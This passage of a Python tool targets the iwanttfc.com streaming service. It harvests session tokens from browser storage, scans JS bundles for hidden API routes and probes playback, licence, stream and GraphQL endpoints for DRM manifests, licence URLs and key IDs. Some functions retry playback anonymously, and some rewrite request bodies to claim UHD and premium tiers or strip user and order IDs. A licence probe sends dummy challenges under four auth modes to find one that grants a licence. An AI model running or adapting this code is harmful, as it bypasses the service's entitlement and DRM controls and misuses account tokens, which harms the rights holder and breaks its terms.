        log("bootstrap: no 'var index = {...}' in the script", "w")
        return BOOT["uri"]
    try:
        uri = json.loads(re.sub(r"<\w+>", "%s", mm.group(1)))
    except ValueError as e:
        log(f"bootstrap: index is not JSON ({e})", "w")
        return BOOT["uri"]
    SETF.write_text(json.dumps(uri, indent=2), encoding="utf-8")
    BOOT["uri"] = uri
    log(f"bootstrap: {len(uri)} URI templates -> {SETF}", "g")
    for k in ("item", "licence", "livestream"):
        if uri.get(k):
            log(f"   {k}: {uri[k]}", "w")
    return uri


def uri_tpl(name, fallback=""):
    t = legacy_bootstrap().get(name)
    if not t and SETF.exists():
        try:
            t = json.loads(SETF.read_text(encoding="utf-8")).get(name)
        except Exception:
            t = None
    return t or fallback


def _tpl_url(name, fallback, value):
    t = uri_tpl(name, fallback)
    return (t % value) if t.startswith("http") else (LEGACY + t) % value


def item_urls(asset):
    t = legacy_bootstrap().get("item")
    out = [((t % asset) if "%s" in t else t)] if t else []
    out += [(LEGACY + p) % asset for p in ITEM_PATHS]
    return _dedupe([u for u in out if u])


def uauth_ok(tok):
    if not tok:
        return False
    try:
        r = http.get(LOGIN10, headers=uauth_headers(tok), timeout=20)
    except http.RequestException:
        return False
    if r.status_code == 404:
        return True
    if r.status_code != 200:
        return False
    try:
        j = r.json()
    except ValueError:
        return True
    return (j or {}).get("status") in (None, "", "OK")


UAUTH_JS = """() => {
  const hits = [];
  const scan = (st) => { try { for (const k of Object.keys(st)) {
    if (!/auth|token|login|session/i.test(k)) continue;
    const v = st.getItem(k) || '';
    const m = v.match(/UserAuthentication\\"?\\s*[:=]\\s*\\"?([A-Za-z0-9._~%\\-]{16,})/);
    if (m) hits.push(m[1]);
    else if (/^eyJ/.test(v)) hits.push(v.replace(/^"|"$/g, ''));
  } } catch (e) {} };
  scan(localStorage); scan(sessionStorage);
  return hits;
}"""


def harvest_uauth(exe=""):
    if sync_playwright is None:
        return ""
    got = []
    try:
        with sync_playwright() as pw:
            ctx = launch_ctx(pw, True, exe)
            page, own = work_page(ctx)
            try:
                page.goto(S + "/", wait_until="domcontentloaded", timeout=45000)
                page.wait_for_timeout(2000)
            except Exception:
                pass
            try:
                got += page.evaluate(UAUTH_JS) or []
            except Exception:
                pass
            try:
                got += [c["value"] for c in ctx.cookies() if c.get("name") == UA_H]
            except Exception:
                pass
            if own:
                try:
                    page.close()
                except Exception:
                    pass
            else:
                close_ctx(ctx)
    except Exception as e:
        log(f"uauth harvest error: {e}", "w")
    for t in got:
        if uauth_ok(t):
            return t
    return got[0] if got else ""


def resolve_uauth(arg=""):
    if arg:
        return arg
    if UAF.exists():
        try:
            tok = json.loads(UAF.read_text(encoding="utf-8")).get("token") or ""
            if tok and uauth_ok(tok):
                return tok
            if tok:
                log("cached UserAuthentication rejected - re-harvesting", "w")
        except Exception:
            pass
    tok = harvest_uauth()
    if tok:
        UAF.write_text(json.dumps({"token": tok, "at": datetime.now().isoformat(timespec="seconds")}),
                       encoding="utf-8")
    return tok


def get_item(asset, token="", mode="header"):
    tried = []
    for url in item_urls(asset):
        try:
            r = http.get(url, headers=uauth_headers(token, mode), timeout=30)
        except http.RequestException:
            tried.append([url, "ERR"])
            continue
        body = r.text or ""
        if r.status_code == 200 and body.lstrip()[:1] in ("{", "["):
            try:
                j = r.json()
            except ValueError:
                j = None
            return {"status": 200, "text": body[:6000], "json": j, "url": url, "tried": tried}
        tried.append([url, r.status_code])
    if not tried:
        return {"status": "ERR", "text": "", "json": None, "url": "", "tried": tried}
    return {"status": tried[-1][1], "text": "", "json": None,
            "url": tried[-1][0], "tried": tried}


def api10_matrix(asset, token=""):
    out = []
    for url in item_urls(asset):
        try:
            r = http.get(url, headers=uauth_headers(token, "header"), timeout=20)
            body = r.text or ""
            hit = r.status_code == 200 and body.lstrip()[:1] in ("{", "[")
            out.append({"url": url, "method": "GET", "status": r.status_code, "json": hit,
                        "preview": body[:140]})
        except http.RequestException as e:
            out.append({"url": url, "method": "GET", "status": "ERR", "json": False,
                        "preview": str(e)})
        log(f"  [{out[-1]['status']}]       {_path(out[-1]['url'])}",
            "g" if out[-1]["json"] else "w")
    item_hits = [x for x in out if x["json"]]
    for lbl, url, method in (("license", LIC10 + asset, "POST"),
                             ("stream", STR10 + asset, "GET")):
        try:
            h = uauth_headers(token, "header")
            r = (http.post(url, headers=h, data=b"probe", timeout=20) if method == "POST"
                 else http.get(url, headers=h, timeout=20))
            out.append({"url": url, "method": method, "status": r.status_code,
                        "json": (r.text or "").lstrip()[:1] in ("{", "["),
                        "preview": (r.text or "")[:120]})
        except http.RequestException as e:
            out.append({"url": url, "method": method, "status": "ERR", "json": False,
                        "preview": str(e)})
        log(f"  [{out[-1]['status']}] {method:<5} {_path(out[-1]['url'])}"
            f"{'  JSON' if out[-1]['json'] else ''}",
            "g" if out[-1]["json"] else "w")
    if item_hits:
        log(f"{len(item_hits)} item path(s) return JSON - legacy will use the first", "g")
        if DEADF.exists():
            DEADF.unlink()
    else:
        log("no /api/1.0/ path answers - the whole lane is gone from the rebuilt site", "e")
        log("next: routes <asset> --context   then   mint <asset> --from-capture --http", "w")
        DEADF.write_text(datetime.now().isoformat(timespec="seconds"), encoding="utf-8")
    return out


def mint_legacy(s, asset, token="", mode="header", quality=""):
    out = {"asset_id": asset, "lane": "legacy-api10", "ok": False, "reason": "", "steps": []}
    r = get_item(asset, token, mode)
    for u, st in r.get("tried") or []:
        out["steps"].append({"step": "item-miss", "url": u, "status": st})
        log(f"  [miss] {st}  {_path(u)}", "w")
    out["steps"].append({"step": "item", "url": r["url"], "status": r["status"],
                         "preview": (r["text"] or "")[:400]})
    log(f"  [item] {r['status']}  {_path(r['url'])}", "g" if r["status"] == 200 else "w")
    if r["status"] != 200:
        out["reason"] = f"item {r['status']} on every candidate path"
        return out
    s.item_url = r["url"]
    _mint_reset(s)
    _scan_blob(s, r["text"], force=True)
    if not s.mpds:
        keys = sorted(r["json"].keys())[:14] if isinstance(r["json"], dict) else "-"
        out["reason"] = "item JSON carries no media.mpds - the gate sits upstream of the manifest"
        log(f"    keys: {keys}", "e")
        return out
    if quality:
        s.mpd_url = next((u for u in s.mpds if f"manifest.{quality}.mpd" in u), s.mpd_url)
    s.uauth = token
    s.license_auth = mode
    s.license_url = _tpl_url("licence", "/api/1.0/license?itemID=%s", asset)
    s.license_method = "POST"
    s.license_mode = "raw"
    s.license_headers = uauth_headers(token, mode)
    s.captured_at = time.time()
    s.api_chain = [{"method": "GET", "url": r["url"],
                    "headers": clean(uauth_headers(token, mode), ("content-type",)),
                    "body": None, "response_body": r["text"][:200000]}]
    out["ok"] = True
    out["kid"] = s.kid
    out["reason"] = f"manifest+license recovered from catalog JSON (kid={'yes' if s.kid else 'no'})"
    log(f"  manifest {s.mpd_url[:100]}", "g")
    log(f"  license  {s.license_url[:100]}", "g")
    return out


def stream_probe(stream_id, token="", mode="header"):
    out = {"stream_id": stream_id, "lane": "legacy-stream", "ok": False, "reason": ""}
    url = _tpl_url("livestream", "/api/1.0/stream?streamID=%s", stream_id)
    h = uauth_headers(token, mode)
    if token and mode == "query":
        url += f"&{UA_H}={quote(token)}"
    h.update({"sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"})
    try:
        r = http.get(url, headers=h, timeout=30)
    except http.RequestException as e:
        out["reason"] = str(e)
        return out
    out["status"] = r.status_code
    out["body"] = r.text[:800]
    try:
        j = r.json()
    except ValueError:
        j = None
    if isinstance(j, dict):
        out["kid"] = j.get("kid", "")
        out["mpd"] = j.get("mpd", "")
        out["m3u8"] = j.get("m3u8", "")
        out["ok"] = bool(out["kid"] or out["mpd"])
    out["reason"] = "granted: kid+mpd returned" if out["ok"] else "no kid/mpd - not entitled or bad streamID"
    log(f"  stream {r.status_code}  kid={'yes' if out['kid'] else 'no'}  "
        f"mpd={'yes' if out['mpd'] else 'no'}", "g" if out["ok"] else "w")
    return out


def lic_probe(s, token=""):
    out = {"url": s.license_url, "results": []}
    if not s.license_url:
        out["note"] = "no license URL - mint first"
        return out
    dummy = base64.b64encode(b"iwant-legacy-probe-challenge-000000000000").decode()
    for mode in ("none", "query", "header", "cookie"):
        url = s.license_url
        h = uauth_headers()
        if token and mode == "query":
            url += ("&" if "?" in url else "?") + f"{UA_H}={quote(token)}"
        elif token and mode == "header":
            h[UA_H] = token
        elif token and mode == "cookie":
            h["cookie"] = f"{UA_H}={token}"
        body = dummy.encode()
        if s.license_mode == "json":
            body = json.dumps({"challenge": dummy}).encode()
            h["content-type"] = "application/json"
        try:
            r = http.post(url, headers=h, data=body, timeout=25)
            res = {"mode": mode, "status": r.status_code, "len": len(r.content),
                   "preview": r.text[:160]}
        except http.RequestException as e:
            res = {"mode": mode, "status": "ERR", "preview": str(e)}
        out["results"].append(res)
        log(f"  license[{mode}] {res['status']}", "g" if res["status"] == 200 else "w")
    out["verdict"] = "GRANT" if any(x["status"] == 200 for x in out["results"]) else "REJECT"
    return out


def devices(token, delete=""):
    url = DEV10 + (f"?action=delete&deviceID={quote(delete)}" if delete else "")
    try:
        r = http.get(url, headers=uauth_headers(token), timeout=25)
    except http.RequestException as e:
        return {"status": "ERR", "text": str(e)}
    try:
        j = r.json()
    except ValueError:
        j = None
    return {"status": r.status_code, "json": j, "text": r.text[:2000]}


# ---------------------------------------------------------------- graphql item probe
def gql_probe(asset, token=""):
    out = {"asset_id": asset, "endpoint": GQL_URL, "attempts": [], "ok": False,
           "reason": "", "mpd": "", "kid": ""}
    h = dict(BH)
    h["x-country-code"] = COUNTRY
    if token:
        h["authorization"] = f"Bearer {token}"
    for query, label, var in GQL_QUERIES:
        payload = {"query": query}
        if var:
            payload["variables"] = {"id": asset}
        try:
            r = http.post(GQL_URL, headers=h, json=payload, timeout=25)
        except http.RequestException as e:
            out["attempts"].append({"label": label, "status": "ERR", "preview": str(e)})
            log(f"  [gql] {label} ERR  {e}", "e")
            continue
        body = (r.text or "")[:1200]
        out["attempts"].append({"label": label, "status": r.status_code, "preview": body})
        log(f"  [gql] {label} {r.status_code}", "g" if r.status_code == 200 else "w")
        m = MPD_U.search(body.replace("\\/", "/"))
        if m and not out["mpd"]:
            out["mpd"] = m.group(1)
        k = re.search(r'"kid"\s*:\s*"([^"]{8,})"', body)
        if k and not out["kid"]:
            out["kid"] = k.group(1)
        if r.status_code == 200 and '"errors"' not in body and '"data"' in body:
            out["ok"] = True
            out["reason"] = f"{label} answered with data"
            if out["mpd"]:
                log(f"  mpd {out['mpd'][:110]}", "g")
            if out["kid"]:
                log(f"  kid {out['kid']}", "g")
            return out
    if out["mpd"]:
        out["ok"] = True
        out["reason"] = "mpd found in a partial response"
        return out
    out["reason"] = "no query variant returned data - read the previews for the field names"
    return out


# ---------------------------------------------------------------- login / token / ident
def do_login(exe):
    if sync_playwright is None:
        sys.exit("pip install playwright")
    with sync_playwright() as pw:
        ctx = launch_ctx(pw, False, exe)
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        try:
            page.goto(S + "/", wait_until="domcontentloaded", timeout=60000)
        except PWTimeout:
            log("landing timeout", "w")
        log("=" * 62)
        log("in the Chrome window: accept cookies/consent, then log in.", "w")
        log("when the site shows you as logged in, come back and press Enter.", "w")
        log("=" * 62)
        try:
            input()
        except EOFError:
            pass
        log(f"url now: {page.url}")
        READY.write_text(datetime.now().isoformat(timespec="seconds"), encoding="utf-8")
        close_ctx(ctx)
    tok, exp = harvest(exe)
    report_ttl(tok, exp)
    log(f"profile seeded -> {PROFILE}", "g")
    ident = collect_ident(tok)
    if ident.get("userId"):
        log("identity seeded", "g")
    ua = resolve_uauth("")
    log(f"legacy UserAuthentication: {'captured' if ua else 'not found'}", "g" if ua else "w")


def do_token(exe):
    tok, exp = resolve_token("", None, exe, allow_harvest=True)
    if not tok:
        log("no bearer found in the profile - run: login", "e")
        return
    cl = _jwt_claims(tok)
    log(f"token ok: {'yes' if _candidate_ok(tok) else 'NO - API rejects it'}")
    report_ttl(tok, exp)
    log(f"cached -> {TOKENF}", "g")


def do_ident(token="", uid="", email="", with_app=False):
    tok, exp = resolve_token(token, None, "", allow_harvest=True)
    report_ttl(tok, exp)
    rec = collect_ident(tok, uid, email)
    if with_app:
        app = app_userdata()
        rec["app"] = app
        au = _n((app.get("storage") or {}).get("ls:analyticsUserId"))
        if au:
            rec["analytics"] = au
            if rec.get("userId") and rec["userId"] != au:
                rec["mismatch"] = {"identity": rec["userId"], "analytics": au}
            else:
                rec.pop("mismatch", None)
        IDENTF.write_text(json.dumps(rec, indent=2), encoding="utf-8")
    rec["jwt"] = _jwt_claims(tok)
    if not rec.get("userId"):
        log("no userId - pass --uid, or run login first", "e")
        return rec
    log("identity captured (raw data kept in file only)", "g")
    log(f"cached -> {IDENTF}", "g")
    return rec


# ---------------------------------------------------------------- grab
GRAB_JS = """() => {
  const d = {};
  try { d.ls = Object.fromEntries(Object.entries(localStorage)); } catch (e) {}
  try { d.ss = Object.fromEntries(Object.entries(sessionStorage)); } catch (e) {}
  const w = /content|asset|episode|movie|title|playback|drm|entitle|session|plan|service|user|profile/i;
  const g = {};
  for (const k of Object.keys(window)) {
    if (!w.test(k)) continue;
    try {
      const v = window[k];
      if (v && typeof v === 'object' && !(v instanceof Node) && !(v instanceof Window)) {
        g[k] = JSON.parse(JSON.stringify(v, (a, b) => typeof b === 'function' ? undefined : b));
      } else if (typeof v === 'string' && v.length < 500) {
        g[k] = v;
      }
    } catch (e) {}
  }
  d.globals = g;
  d.resources = performance.getEntriesByType('resource').map(e => e.name)
    .filter(n => /api\\.iwanttfc|entitlement|playback|content|catalog|graphql|api\\/1\\.0/i.test(n)).slice(-200);
  d.url = location.href;
  return d;
}"""


def do_grab(asset, exe="", headless=True, token=""):
    if sync_playwright is None:
        sys.exit("pip install playwright")
    doc = {"at": datetime.now().isoformat(timespec="seconds"), "asset_id": asset}
    with sync_playwright() as pw:
        ctx = launch_ctx(pw, headless, exe)
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        try:
            page.goto(S + "/", wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(4000)
            page.goto(f"{S}/player/{asset}" if asset else S + "/",
                      wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(6000)
        except Exception:
            log("load timeout while grabbing", "w")
        _poke_play(page)
        page.wait_for_timeout(3000)
        try:
            doc.update(page.evaluate(GRAB_JS) or {})
        except Exception as e:
            log(f"grab eval failed: {e}", "e")
        try:
            doc["cookies"] = [{"name": c["name"], "domain": c["domain"]} for c in ctx.cookies()]
        except Exception:
            doc["cookies"] = []
        close_ctx(ctx)
    GRABF.write_text(json.dumps(doc, indent=2), encoding="utf-8")
    body = compose_body(doc)
    log(f"grab -> {GRABF}", "g")
    log(f"storage keys : {sorted(list((doc.get('ls') or {}).keys()) + list((doc.get('ss') or {}).keys()))[:12]}")
    log(f"globals      : {sorted((doc.get('globals') or {}).keys())[:12]}")
    log(f"api urls     : {len(doc.get('resources') or [])}")
    if body:
        log(f"composed body: {json.dumps(body)}", "g")
    else:
        log("no body keys found - storage may be empty", "w")
    return doc


def compose_body(doc):
    flat = {}

    def walk(x):
        if isinstance(x, dict):
            for k, v in x.items():
                if isinstance(v, (dict, list)):
                    walk(v)
                elif isinstance(v, (str, int, float)) and k not in flat:
                    flat[k] = v
        elif isinstance(x, list):
            for v in x:
                walk(v)

    for key in ("ls", "ss", "globals"):
        walk(doc.get(key) or {})
    body = {}
    for k in BODY_KEYS:
        if k in flat and _n(flat[k]):
            body[k] = flat[k]
    if doc.get("asset_id") and "assetId" not in body:
        body["assetId"] = doc["asset_id"]
    return body


# ---------------------------------------------------------------- route discovery
def _bundle_urls(page):
    urls = set()
    try:
        for u in page.evaluate(
                "()=>[...document.querySelectorAll('script[src]')].map(s=>s.src)"):
            urls.add(u)
    except Exception:
        pass
    try:
        for u in page.evaluate(
                "()=>performance.getEntriesByType('resource')"
                ".map(e=>e.name).filter(n=>/\\.js(\\?|$)/.test(n))"):
            urls.add(u)
    except Exception:
        pass
    return urls


def discover_routes(asset, exe="", headless=True, context=False, no_ads=True):
    if sync_playwright is None:
        sys.exit("pip install playwright")
    routes, ctxs, bases = set(), [], set()
    bundles = set()
    try:
        with sync_playwright() as pw:
            ctx = launch_ctx(pw, headless, exe)
            page = ctx.pages[0] if ctx.pages else ctx.new_page()
            if no_ads:
                for pat in AD_PATTERNS:
                    try:
                        page.route(pat, lambda r: r.abort())
                    except Exception:
                        pass
            target = f"{S}/player/{asset}" if asset else S + "/"
            try:
                page.goto(S + "/", wait_until="domcontentloaded", timeout=60000)
                page.wait_for_timeout(4000)
                page.goto(target, wait_until="domcontentloaded", timeout=60000)
                page.wait_for_timeout(6000)
            except Exception:
                log("navigation timeout while scanning", "w")
            bundles |= _bundle_urls(page)
            close_ctx(ctx)
    except SystemExit:
        raise
    except Exception as e:
        log(f"scan error: {e}", "w")
    if not bundles:
        log("no JS bundles found - is the page loading at all?", "e")
        return {}
    log(f"scanning {len(bundles)} bundle(s) ...")
    for u in sorted(bundles):
        try:
            r = http.get(u, headers={"user-agent": UA, "referer": S + "/"}, timeout=30)
        except http.RequestException:
            continue
        if r.status_code != 200:
            continue
        t = r.text
        for m in API_BASE_RE.finditer(t):
            bases.add(m.group(0))
        for m in ROUTE_URL_RE.finditer(t):
            routes.add(UUID_RE.sub("<uuid>", m.group(1).split("?")[0]))
        for m in API10_RE.finditer(t):
            routes.add(m.group(0))
        for m in ROUTE_RE.finditer(t):
            p = m.group(0)
            if not p.startswith("/"):
                p = "/" + p
            p = UUID_RE.sub("<uuid>", p.split("?")[0])
            p = re.sub(r"\$\{[^}]+\}", "<var>", p)
            routes.add(p)
        if context:
            for m in re.finditer(r"(?:playback/start|consumer/graphql|api/1\.0)", t, re.I):
                a = max(0, m.start() - 160)
                ctxs.append(t[a:m.end() + 200].replace("\n", " "))
    if not routes:
        log("no routes matched", "e")
        return {}
    doc = {"at": datetime.now().isoformat(timespec="seconds"),
           "routes": sorted(routes), "bases": sorted(bases), "contexts": ctxs[:80]}
    ROUTESF.write_text(json.dumps(doc, indent=2), encoding="utf-8")
    for b in sorted(bases):
        log(f"   base   {b}", "g")
    for p in sorted(routes):
        log(f"   {p}", "w")
    if context:
        for c in ctxs[:40]:
            print(f"\n   ...{c}...")
    log(f"{len(routes)} route(s) -> {ROUTESF}", "g")
    return doc


def load_routes():
    if not ROUTESF.exists():
        return {"routes": [], "bases": [], "contexts": []}
    try:
        d = json.loads(ROUTESF.read_text(encoding="utf-8"))
        if isinstance(d.get("routes"), dict):
            d["routes"] = sorted(d["routes"])
        return {"routes": d.get("routes") or [], "bases": d.get("bases") or [],
                "contexts": d.get("contexts") or []}
    except Exception:
        return {"routes": [], "bases": [], "contexts": []}


def _dedupe(seq):
    seen, out = set(), []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def _abs(u, asset=""):
    u = u.replace("<uuid>", asset).replace("%s", asset).replace("<var>", asset)
    return u if u.startswith("http") else API + u


def start_candidates(asset, override=""):
    """The real shape, straight out of the bundle:
         entitlementMiddlewareBaseUrl + 'playback/start/' + id + '?' + query
       The /entitlement prefix and the query are both load-bearing.
       Bare /playback/start/<id> is the edge-only path - it 403s on Akamai."""
    if override:
        return [_abs(override, asset)]
    qs = START_QS.format(a=quote(asset))
    out = []
    tpl = load_template()
    if tpl.get("url"):
        out.append(tpl["url"])
    paths = list(START_FALLBACKS)
    for p in load_routes()["routes"]:
        if "start" not in p.lower() or "api/1.0" in p.lower():
            continue
        paths.append(p if ("<uuid>" in p or "%s" in p) else p.rstrip("/") + "/%s")
    for p in paths:
        u = _abs(p, asset)
        if "?" not in u:
            u += qs
        out.append(u)
    return _dedupe(out)


def session_candidates(override=""):
    if override:
        return [override]
    r = load_routes()["routes"]
    c = [p for p in r if "session" in p.lower() or "init" in p.lower()]
    return _dedupe(c + SESSION_CANDIDATES)


# ---------------------------------------------------------------- in-page mint
INPAGE_JS = """async ({asset, sessions, starts, bodies, token, headers}) => {
  const A = 'https://api.iwanttfc.com';
  const abs = (u) => (u && u.startsWith('http')) ? u : A + u;
  const out = [];
  const H = Object.assign({}, headers || {});
  H['accept'] = 'application/json, text/plain, */*';
  H['content-type'] = 'application/json';
  if (token) H['authorization'] = 'Bearer ' + token; else delete H['authorization'];
  const post = async (u, b) => {
    const url = abs(u);
    try {
      const r = await fetch(url, {method: 'POST', headers: H,
        body: typeof b === 'string' ? b : JSON.stringify(b || {}), credentials: 'include'});
      return {status: r.status, text: (await r.text()).slice(0, 4000), url};
    } catch (e) { return {status: 'ERR', text: String(e), url}; }
  };
  let sid = '';
  for (const ep of sessions) {
    const r = await post(ep, {assetId: asset});
    out.push({step: 'session', url: r.url, status: r.status, text: r.text});
    const m = r.text.match(/"(?:playbackSessionId|sessionId|playbackId)"\\s*:\\s*"([^"]{8,})"/);
    if (m) { sid = m[1]; break; }
  }
  const variants = bodies && bodies.length ? bodies : [{assetId: asset}];
  for (const st of starts) {
    for (const b of variants) {
      let use = b;
      if (typeof use === 'object') {
        use = Object.assign({}, b);
        if (sid && !use.playbackSessionId) use.playbackSessionId = sid;
      }
      const r = await post(st, use);
      out.push({step: 'start', url: r.url, body: use, status: r.status, text: r.text});
      if (r.status === 200 && (r.text.includes('.mpd') || r.text.includes('ezdrm'))) {
        return {out, sid};
      }
    }
  }
  return {out, sid};
}"""


def mint_in_page(s, asset, token="", exe="", headless=False, session_endpoint="",
                 start_endpoint="", bodies=None, no_session=False, no_ads=True):
    out = {"asset_id": asset, "attempts": [], "session_id": "", "ok": False,
           "reason": "", "mode": "in-page"}
    if sync_playwright is None:
        sys.exit("pip install playwright")
    sessions = [] if no_session else session_candidates(session_endpoint)
    starts = start_candidates(asset, start_endpoint)
    log(f"  starts: {[_path(u) for u in starts]}")
    with sync_playwright() as pw:
        ctx = launch_ctx(pw, headless, exe)
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        if no_ads:
            for pat in AD_PATTERNS:
                try:
                    page.route(pat, lambda r: r.abort())
                except Exception:
                    pass
        try:
            page.goto(S + "/", wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(4000)
            page.goto(s.player_url or f"{S}/player/{asset}",
                      wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(4000)
        except Exception:
            log("page load timeout - continuing anyway", "w")
        try:
            res = page.evaluate(INPAGE_JS, {"asset": asset, "sessions": sessions,
                                            "starts": starts, "bodies": bodies or [],
                                            "token": token, "headers": BH})
        except Exception as e:
            log(f"in-page eval failed: {e}", "e")
            close_ctx(ctx)
            out["reason"] = f"eval failed: {e}"
            return out
        close_ctx(ctx)
    out["session_id"] = res.get("sid") or ""
    for a in res.get("out") or []:
        out["attempts"].append(a)
        st = a["status"]
        tag = "g" if st == 200 else "w"
        log(f"  [in-page] {a['step']} {st}  {_path(a.get('url'))}", tag)
        if st != 200:
            log(f"    {'EDGE ' if EDGE_RE.search(a['text'] or '') else ''}body: {a['text'][:400]}", "e")
    ok = [a for a in out["attempts"] if a["step"] == "start" and a["status"] == 200
          and (".mpd" in a["text"] or "ezdrm" in a["text"])]
    if not ok:
        out["reason"] = "in-page: no start variant returned a manifest"
        return out
    a = ok[0]
    _mint_reset(s)
    _scan_blob(s, a["text"], force=True)
    if not (s.mpd_url and s.license_url):
        out["reason"] = "200 but no manifest/license parsed"
        return out
    s.api_chain = [{
        "method": "POST", "url": a.get("url") or "",
        "headers": clean(BH, ("content-type",)),
        "body": a.get("body") if isinstance(a.get("body"), str) else json.dumps(a.get("body") or {}),
        "response_body": a["text"]}]
    _mint_finish(s)
    out["ok"] = True
    out["reason"] = f"in-page mint via {_path(a.get('url'))}"
    return out


# ---------------------------------------------------------------- direct mint
def _mint_call(url, body, token):
    h = dict(BH)
    if token:
        h["authorization"] = f"Bearer {token}"
    else:
        h.pop("authorization", None)
    data = body if isinstance(body, str) else (json.dumps(body) if body is not None else None)
    try:
        r = http.request("POST", url, headers=h, data=data, timeout=30)
    except http.RequestException as e:
        return {"status": "ERR", "text": str(e), "json": None}
    try:
        j = r.json()
    except ValueError:
        j = None
    return {"status": r.status_code, "text": r.text[:6000], "json": j}


def _find_sid(j):
    for o in _walk(j):
        if isinstance(o, dict):
            for k in SID_KEYS:
                v = o.get(k)
                if isinstance(v, str) and len(v) >= 8:
                    return v
    return ""


def _mint_pass(s, asset, token, starts, session_endpoint, label, out, no_session, bodies):
    sid = ""
    sess_step = None
    have_sid = any(isinstance(b, dict) and b.get("playbackSessionId") for b in (bodies or []))
    if not no_session and not have_sid:
        for ep in session_candidates(session_endpoint):
            url = _abs(ep, asset)
            r = _mint_call(url, {"assetId": asset}, token)
            out["attempts"].append({"pass": label, "step": "session", "url": url,
                                    "status": r["status"], "preview": r["text"][:300]})
            log(f"  [{label}] session {r['status']}  {_path(url)}")
            sid = _find_sid(r["json"])
            if sid or r["status"] == 200:
                if sid:
                    out["session_id"] = sid
                sess_step = {"method": "POST", "url": url,
                             "headers": clean(BH, ("content-type",)),
                             "body": json.dumps({"assetId": asset}),
                             "response_body": r["text"][:200000]}
                break
    variants = bodies or [{"assetId": asset}]
    fresh = str(uuid.uuid4())
    for start_url in starts:
        for body in variants:
            use = body
            if isinstance(use, dict):
                use = dict(body)
                use["playbackSessionId"] = sid or fresh
            r = _mint_call(start_url, use, token)
            out["attempts"].append({"pass": label, "step": "start", "url": start_url,
                                    "body": use, "status": r["status"],
                                    "preview": r["text"][:600]})
            edge = bool(EDGE_RE.search(r["text"] or ""))
            log(f"  [{label}] start {r['status']}{' EDGE' if edge else ''}  {_path(start_url)}",
                "g" if r["status"] == 200 else "w")
            if r["status"] != 200:
                if not edge:
                    log(f"    body: {r['text'][:400]}", "e")
                continue
            _mint_reset(s)
            _scan_blob(s, r["text"], force=True)
            if not (s.mpd_url and s.license_url):
                continue
            step = {"method": "POST", "url": start_url,
                    "headers": clean(BH, ("content-type",)),
                    "body": use if isinstance(use, str) else json.dumps(use),
                    "response_body": r["text"][:200000]}
            s.api_chain = ([sess_step] if sess_step else []) + [step]
            _mint_finish(s)
            out["ok"] = True
            out["reason"] = f"minted ({label}) via {_path(start_url)}"
            return True
    return False


def mint(s, asset, token="", session_endpoint="", start_endpoint="", try_anon=True,
         in_page=True, exe="", no_session=False, bodies=None, no_ads=True, extra=None):
    out = {"asset_id": asset, "attempts": [], "session_id": "", "ok": False, "reason": "",
           "token_exp": jwt_exp(token) if token else 0, "bodies": bodies or [],
           "country": COUNTRY, "platform": PLATFORM}
    if extra:
        for b in (bodies or []):
            if isinstance(b, dict):
                for k, v in extra.items():
                    if v and k not in b:
                        b[k] = v
                        log(f"added {k}={v[:12]}... to a body variant", "w")
    if in_page:
        res = mint_in_page(s, asset, token, exe, False, session_endpoint, start_endpoint,
                           bodies, no_session, no_ads)
        if res["ok"]:
            return res
        out["attempts"].extend(res["attempts"])
        out["reason"] = res["reason"]
        log("in-page failed - falling back to plain HTTP", "w")
    starts = start_candidates(asset, start_endpoint)
    passes = []
    if token:
        passes.append((token, "auth"))
    if try_anon or not token:
        passes.append(("", "anon"))
    for tok, label in passes:
        if _mint_pass(s, asset, tok, starts, session_endpoint, label, out, no_session, bodies):
            return out
    if not out["reason"]:
        out["reason"] = "no pass produced manifest+license"
    return out


def parse_body_arg(arg):
    if not arg:
        return []
    raw = arg
    if arg.startswith("@"):
        raw = Path(arg[1:]).read_text(encoding="utf-8")
    try:
        j = json.loads(raw)
    except ValueError as e:
        sys.exit(f"--body is not valid JSON: {e}")
    return j if isinstance(j, list) else [j]


def _cap_premium(body):
    try:
        b = json.loads(json.dumps(body))
    except Exception:
        return body
    caps = b.get("playbackCapabilities")
    if isinstance(caps, dict):
        caps["resolution"] = ["uhd"]
        if "drm" in caps and isinstance(caps["drm"], list):
            caps["drm"] = list(dict.fromkeys(caps["drm"] + ["wv"]))
    for k, v in PREMIUM_BODY.items():
        b[k] = v
    return b


def _gql_premium(body):
    try:
        b = json.loads(json.dumps(body))
    except Exception:
        return body
    var = b.get("variables")
    if isinstance(var, dict):
        for k in GQL_KEYS:
            if k in var or k in ("serviceId", "quality"):
                var[k] = PREMIUM_BODY.get(k, var.get(k))
    return b


def body_variants(arg, from_grab, asset):
    if arg:
        return parse_body_arg(arg)
    v = []
    tpl = load_template()
    base = load_template_body()
    if base:
        kind = tpl.get("kind") or "rest"
        log(f"template body loaded ({sorted(base)}, kind={kind})", "g")
        if kind == "graphql":
            v.append(dict(base))
            v.append(_gql_premium(base))
        else:
            v.append(dict(base))
            v.append(_cap_premium(base))
            cp = _cap_premium(base)
            cp.pop("userId", None)
            cp.pop("orderId", None)
            v.append(cp)
    if from_grab and GRABF.exists():
        try:
            v.append(compose_body(json.loads(GRABF.read_text(encoding="utf-8"))))
        except Exception:
            pass
    v.append({"assetId": asset})
    return [x for x in v if x]


# ---------------------------------------------------------------- capture
def _mpd_started(s):
    return any(START_RE.search(o.get("url") or "") for o in s.observed)


def _take_mpd(s, url, started=False):
    """A trailer/preview MPD is not the stream. Let the real manifest replace it
    once playback/start has fired; never let a later trailer replace a real one."""
    u = norm_mpd(url)
    cur = s.mpd_url
    if cur == u:
        return False
    trailer_new = bool(TRAILER_RE.search(u))
    if not cur:
        take = True
    elif TRAILER_RE.search(cur) and not trailer_new:
        take = True
    elif started and not trailer_new and not TRAILER_RE.search(cur):
        take = True
    else:
        take = False
    if take:
        s.mpd_url = u
        ex = EXP.search(u)
        s.mpd_exp = float(ex.group(1)) if ex else 0.0
        s.captured_at = time.time()
    return take


def _scan_blob(s, blob, force=False):
    if not blob:
        return False
    b = blob.replace("\\/", "/")
    ch = False
    if force or not s.mpd_url:
        m = MPD_U.search(b)
        if m:
